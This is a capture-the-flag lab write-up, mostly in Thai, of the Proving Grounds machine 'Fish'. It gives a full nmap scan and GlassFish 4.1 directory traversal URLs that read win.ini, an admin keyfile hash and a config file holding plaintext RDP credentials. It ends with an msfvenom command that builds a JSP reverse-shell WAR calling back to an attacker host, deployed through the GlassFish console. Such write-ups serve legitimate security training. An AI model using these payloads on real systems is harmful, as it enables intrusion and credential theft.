# Recon 
## TCP Scan 

```bash
sudo ../Tools/scan.sh  192.168.175.168
[*] Running rustscan...
[*] Running nmap on ports: 135,139,445,3389,3700,4848,5040,6060,7676,7680,8080,8686,8181,49664,49665,49667,49668,49666,49669,49670
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 22:15 +07
Nmap scan report for 192.168.175.168
Host is up (0.034s latency).

PORT      STATE SERVICE              VERSION
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
|_ssl-date: 2021-10-30T05:03:23+00:00; -3y237d10h14m57s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: FISHYYY
|   NetBIOS_Domain_Name: FISHYYY
|   NetBIOS_Computer_Name: FISHYYY
|   DNS_Domain_Name: Fishyyy
|   DNS_Computer_Name: Fishyyy
|   Product_Version: 10.0.19041
|_  System_Time: 2021-10-30T05:03:10+00:00
| ssl-cert: Subject: commonName=Fishyyy
| Not valid before: 2021-10-29T04:54:04
|_Not valid after:  2022-04-30T04:54:04
3700/tcp  open  giop
| fingerprint-strings: 
|   GetRequest, X11Probe: 
|     GIOP
|   giop: 
|     GIOP
|     (IDL:omg.org/SendingContext/CodeBase:1.0
|     169.254.99.240
|     169.254.99.240
|_    default
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-server-header: GlassFish Server Open Source Edition  4.1 
|_http-title: Login
5040/tcp  open  unknown
6060/tcp  open  x11?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"425-1267803922000"
|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
|     Content-Type: text/html
|     Content-Length: 425
|     Date: Sat, 30 Oct 2021 05:00:39 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <html>
|     <head>
|     <META HTTP-EQUIV="REFRESH" CONTENT="1;URL=app">
|     </head>
|     <body>
|     <script type="text/javascript">
|     <!--
|     currentLocation = window.location.pathname;
|     if(currentLocation.charAt(currentLocation.length - 1) == "/"){
|     window.location = window.location + "app";
|     }else{
|     window.location = window.location + "/app";
|     //-->
|     </script>
|     Loading Administration console. Please wait...
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: JSESSIONID=0984AA8E65F19F930C67728EEA1E576D; Path=/
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 5028
|     Date: Sat, 30 Oct 2021 05:00:41 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
|     <title>
|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
|     </title>
|     <meta NAME="Description" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta NAME="Keywords" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta http-equiv="X-UA-Compatible" content="IE=10" />
|     <link rel="icon" type="image/png" href="images/favicon.png">
|     <link type="text/css" rel="stylesheet" href="images/AjaxFileExplorer.css">
|     <link rel="stylesheet" type="text/css"
|   JavaRMI: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 145
|     Date: Sat, 30 Oct 2021 05:00:34 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|_    <html><head><title>Oops</title><body><h1>Oops</h1><p>Well, that didn't go as we had expected.</p><p>This error has been logged.</p></body></html>
7676/tcp  open  java-message-service Java Message Service 301
7680/tcp  open  pando-pub?
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-title: Data Web
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
|_http-server-header: GlassFish Server Open Source Edition  4.1 
8181/tcp  open  ssl/http             Sun GlassFish Open Source Edition  4.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Data Web
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Not valid before: 2014-08-21T13:30:10
|_Not valid after:  2024-08-18T13:30:10
|_http-server-header: GlassFish Server Open Source Edition  4.1 
| http-methods: 
|_  Potentially risky methods: PUT DELETE TRACE
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @169.254.99.240:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
49670/tcp open  msrpc                Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3700-TCP:V=7.95%I=7%D=6/24%Time=685AC117%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,C,"GIOP\x01\x02\0\x06\0\0\0\0")%r(X11Probe,C,"GIOP\x01\x
SF:02\0\x06\0\0\0\0")%r(giop,D0C,"GIOP\x01\0\0\x01\0\0\r\0\0\0\0\x03NEO\0\
SF:0\0\0\x02\0\x14\0\0\0\0\0\x06\0\0\x01P\0\0\0\0\0\0\0\(IDL:omg\.org/Send
SF:ingContext/CodeBase:1\.0\0\0\0\0\x01\0\0\0\0\0\0\x01\x14\0\x01\x02\0\0\
SF:0\0\x0f169\.254\.99\.240\0\0\x0et\0\0\0\0\0\x19\xaf\xab\xcb\0\0\0\0\x02
SF:\0\0\0d\0\0\0\x08\0\0\0\0\0\0\0\0\x14\0\0\0\0\0\0\x05\0\0\0\x01\0\0\0\x
SF:20\0\0\0\0\0\x01\0\x01\0\0\0\x02\x05\x01\0\x01\0\x01\0\x20\0\x01\x01\t\
SF:0\0\0\x01\0\x01\x01\0\0\0\0&\0\0\0\x02\0\x02\0\0\0\0\0!\0\0\0\x80\0\0\0
SF:\0\0\0\0\x01\0\0\0\0\0\0\0\$\0\0\0\"\0\0\0f\0\0\0\0\0\0\0\x01\0\0\0\x0f
SF:169\.254\.99\.240\0\0\x0e\xec\0@\0\0\0\0\0\0\0\x08\x06\x06g\x81\x02\x01
SF:\x01\x01\0\0\0\x17\x04\x01\0\x08\x06\x06g\x81\x02\x01\x01\x01\0\0\0\x07
SF:default\0\x04\0\0\0\0\0\0\0\0\0\0\x01\0\0\0\x08\x06\x06g\x81\x02\x01\x0
SF:1\x01\0\0\0\x0f\0\0\0\x1f\0\0\0\x04\0\0\0\x03\0\0\0\x20\0\0\0\x04\0\0\0
SF:\x01\0\0\0\x0e\0\0\x0bR\0\0\0\0\0\0\x0bJ\0o\0r\0g\0\.\0o\0m\0g\0\.\0C\0
SF:O\0R\0B\0A\0\.\0O\0B\0J\0E\0C\0T\0_\0N\0O\0T\0_\0E\0X\0I\0S\0T\0:\0\x20
SF:\0F\0I\0N\0E\0:\0\x20\x000\x002\x005\x001\x000\x000\x000\x002\0:\0\x20\
SF:0T\0h\0e\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0I\0D\0\x20\0i\0n\0\x20\0t\0h\0e
SF:\0\x20\0t\0a\0r\0g\0e\0t\0\x20\0o\0b\0j\0e\0c\0t\0\x20\0k\0e\0y\0\x20\0
SF:d\0o\0e\0s\0\x20\0n\0o\0t\0\x20\0m\0a\0t\0c\0h\0\x20\0t\0h\0e\0\x20\0s\
SF:0e\0r\0v\0e\0r\0\x20\0k\0e\0y\0\x20\0e\0x\0p\0e\0c\0t\0e\0d\0\x20\0b\0y
SF:\0\x20\0t\0h\0e\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0\x20\0v\0m\0c\0i\0d\0:\0
SF:\x20\0O\0M\0G\0\x20\0\x20\0m\0i\0n\0o\0r\0\x20\0c\0o\0d\0e\0:\0\x20\x00
SF:2\0\x20\0\x20\0c\0o\0m\0p\0l\0e\0t\0e\0d\0:\0\x20\0N\0o\0\r\0\n\0\t\0a\
SF:0t\0\x20\0c\0o\0m\0\.\0s\0u\0n\0\.\0p\0r\0o\0x\0y\0\.\0\$\0P\0r\0o\0x\0
SF:y\x001\x004\x000\0\.\0b\0a\0d\0S\0e\0r\0v\0e\0r\0I\0d\0\(\0U\0n\0k\0n\0
SF:o\0w\0n\0\x20\0S\0o\0u\0r\0c\0e\0\)\0\r\0\n\0\t\0a\0t\0\x20\0c\0o\0m\0\
SF:.\0s\0u\0n\0\.\0c\0o\0r\0b");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6060-TCP:V=7.95%I=7%D=6/24%Time=685AC112%P=aarch64-unknown-linux-gn
SF:u%r(JavaRMI,139,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;cha
SF:rset=utf-8\r\nContent-Length:\x20145\r\nDate:\x20Sat,\x2030\x20Oct\x202
SF:021\x2005:00:34\x20GMT\r\nConnection:\x20close\r\nServer:\x20Synametric
SF:s\x20Web\x20Server\x20v7\r\n\r\n<html><head><title>Oops</title><body><h
SF:1>Oops</h1><p>Well,\x20that\x20didn't\x20go\x20as\x20we\x20had\x20expec
SF:ted\.</p><p>This\x20error\x20has\x20been\x20logged\.</p></body></html>"
SF:)%r(GetRequest,2A4,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\n
SF:ETag:\x20W/\"425-1267803922000\"\r\nLast-Modified:\x20Fri,\x2005\x20Mar
SF:\x202010\x2015:45:22\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Le
SF:ngth:\x20425\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2005:00:39\x20GMT\r
SF:\nConnection:\x20close\r\nServer:\x20Synametrics\x20Web\x20Server\x20v7
SF:\r\n\r\n<html>\r\n<head>\r\n<META\x20HTTP-EQUIV=\"REFRESH\"\x20CONTENT=
SF:\"1;URL=app\">\r\n</head>\r\n<body>\r\n\r\n<script\x20type=\"text/javas
SF:cript\">\r\n<!--\r\n\r\nvar\x20currentLocation\x20=\x20window\.location
SF:\.pathname;\r\nif\(currentLocation\.charAt\(currentLocation\.length\x20
SF:-\x201\)\x20==\x20\"/\"\){\r\n\twindow\.location\x20=\x20window\.locati
SF:on\x20\+\x20\"app\";\r\n}else{\r\n\twindow\.location\x20=\x20window\.lo
SF:cation\x20\+\x20\"/app\";\r\n}\x20\r\n//-->\r\n</script>\r\n\r\nLoading
SF:\x20Administration\x20console\.\x20Please\x20wait\.\.\.\r\n</body>\r\n<
SF:/html>")%r(HTTPOptions,14D3,"HTTP/1\.1\x20403\x20\r\nCache-Control:\x20
SF:private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\n
SF:Set-Cookie:\x20JSESSIONID=0984AA8E65F19F930C67728EEA1E576D;\x20Path=/\r
SF:\nContent-Type:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x205
SF:028\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2005:00:41\x20GMT\r\nConnect
SF:ion:\x20close\r\nServer:\x20Synametrics\x20Web\x20Server\x20v7\r\n\r\n<
SF:!DOCTYPE\x20html>\r\n\r\n\r\n<html>\r\n<head>\r\n<meta\x20http-equiv=\"
SF:content-type\"\x20content=\"text/html;\x20charset=UTF-8\"\x20/>\r\n<tit
SF:le>\r\nSynaMan\x20-\x20Synametrics\x20File\x20Manager\x20-\x20Version:\
SF:x205\.1\x20-\x20build\x201595\x20\r\n</title>\r\n\r\n\r\n<meta\x20NAME=
SF:\"Description\"\x20CONTENT=\"SynaMan\x20-\x20Synametrics\x20File\x20Man
SF:ager\"\x20/>\r\n<meta\x20NAME=\"Keywords\"\x20CONTENT=\"SynaMan\x20-\x2
SF:0Synametrics\x20File\x20Manager\"\x20/>\r\n\r\n\r\n<meta\x20http-equiv=
SF:\"X-UA-Compatible\"\x20content=\"IE=10\"\x20/>\r\n\r\n\r\n\r\n<link\x20
SF:rel=\"icon\"\x20type=\"image/png\"\x20href=\"images/favicon\.png\">\r\n
SF:\x20\r\n\x20\r\n\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x2
SF:0href=\"images/AjaxFileExplorer\.css\">\r\n\r\n\r\n\r\n<link\x20rel=\"s
SF:tylesheet\"\x20type=\"text/css\"\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1333d10h14m56s, deviation: 0s, median: -1333d10h14m56s
| smb2-time: 
|   date: 2021-10-30T05:03:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.77 seconds

```

# TCP 4848

เป็น GlassFish Open Source Edition  4.1 

![[Challenge/ProvingGround/Fish/IMG/001.png]]

![[Challenge/ProvingGround/Fish/IMG/002.png]]

```
http://192.168.175.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
```

![[Challenge/ProvingGround/Fish/IMG/003.png]]

จะสังเกตว่าเราสามารถอ่านไฟล์ win.ini ได้ จากนั้นทำการตรวจสอบ https://docs.oracle.com/cd/E18930_01/html/821-2436/gjjoz.html จะเห็นได้ว่ามีไฟล์ admin-keyfile จะถูกเก็บไว้ในเครื่อง ที่ path /domains/domain-name/config/admin-keyfile


![[Challenge/ProvingGround/Fish/IMG/005.png]]
ref: https://stackoverflow.com/questions/41078683/how-do-i-reset-the-forgotten-password-of-glassfish-server-4 

กำหนด path เป้าหมาย เพื่อตรวจสอบข้อมูลของ admin-key ซึ่งเป็น glassfish4/glassfish/domains/domain1/config/admin-keyfile จากนั้นทดสอบอ่านไฟล์ที่กำหนด 
```
http://192.168.175.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afglassfish4/glassfish/domains/domain1/config/admin-keyfile
```

![[Challenge/ProvingGround/Fish/IMG/004.png]]
```cred
admin;{SSHA256}aLatQQ3qEJHinsX4N/+V/45mJwFSkXN5w7vz3P6kHy4jrX+U7hXCkQ==;asadmin
```
ซึ่งจากข้อมูลข้างต้นเราไม่สามารถ Crack ได้ จึงไปตรวจดูไฟล์ของ Service อื่นๆ เช่น  C:\SynaMan\config\AppConfig.xml 

```
http://192.168.175.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml
```
![[Challenge/ProvingGround/Fish/IMG/006.png]]

จากข้อมูลข้างต้นทำให้เราเห็นข้อมูล Credential ของ arthur:KingOfAtlantis 

# RDP as arthur 

```bash
xfreerdp3 +dynamic-resolution  /cert:ignore /clipboard /u:arthur /p:'KingOfAtlantis' /v:192.168.175.168
```
![[Challenge/ProvingGround/Fish/IMG/007.png]]

# Priv  via TCP 4848 

จากนั้นให้เราทดสอบเข้า http://localhost:4848 เราจะสามารถเข้า GlassFish ได้โดยไม่ต้องใช้ Credential ใดๆ 
![[Challenge/ProvingGround/Fish/IMG/008.png]]


เนื่องจาก GlassFish สามารถ upload ไฟล์สำหรับ Deploy Application ในภาษา jsp ที่มี extension เป็น .war (.war file เป็นมาตรฐานของ Java โดยย่อมาจาก web application archive (WAR)) ซึ่งเราจะต้องสร้าง shell  

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.245 LPORT=4444 -f war > shell.war
```

จากนั้นนำไป upload ที่ .war file → Application → Deploy an Application จากนั้น upload ไฟล์ shell.war เมื่อ upload เสร็จให้เลือก Lunch 

![[Challenge/ProvingGround/Fish/IMG/009.png]]

ฝั่งที่เป็น Reverse Shell ก็จะได้รับ Shqll ตามภาพ 
![[Challenge/ProvingGround/Fish/IMG/010.png]]

# PWN